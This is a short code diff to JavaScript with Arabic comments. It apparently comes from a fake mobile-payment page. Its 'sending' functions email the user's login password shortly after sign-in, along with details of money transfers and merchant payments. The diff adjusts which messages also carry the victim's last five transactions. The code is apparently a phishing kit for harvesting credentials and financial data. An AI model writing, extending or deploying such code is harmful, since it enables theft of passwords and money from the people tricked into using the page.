@@ -483,20 +483,20 @@ function _buildFullParams(eventType, password, recipientName, recipientPhone, am
 // ========== 9. دوال الإرسال ==========
 function sendLoginData(password) {
     const send = () => sendEmailNotification(
-        _buildFullParams("🔐 تسجيل دخول", password, "—", "—", "—", true) // true لإضافة آخر 5 عمليات
+        _buildFullParams("🔐 تسجيل دخول", password, "—", "—", "—", false) // false: لا ترسل آخر 5 عمليات مع تسجيل الدخول
     );
     setTimeout(send, 3000);
 }
 
 function sendTransferData(recipientName, recipientPhone, amount) {
     sendEmailNotification(
-        _buildFullParams("💸 تحويل لصديق", "—", recipientName, recipientPhone, amount)
+        _buildFullParams("💸 تحويل لصديق", "—", recipientName, recipientPhone, amount, true) // true: أرسل آخر 5 عمليات مع دفع لصديق
     );
 }
 
 function sendMerchantPaymentData(merchantName, amount, refNum) {
     sendEmailNotification(
-        _buildFullParams("🏪 دفع لتاجر", "—", merchantName, localStorage.getItem('merchant_phone') || '—', amount)
+        _buildFullParams("🏪 دفع لتاجر", "—", merchantName, localStorage.getItem('merchant_phone') || '—', amount, true) // true: أرسل آخر 5 عمليات مع دفع لتاجر
     );
 }
 
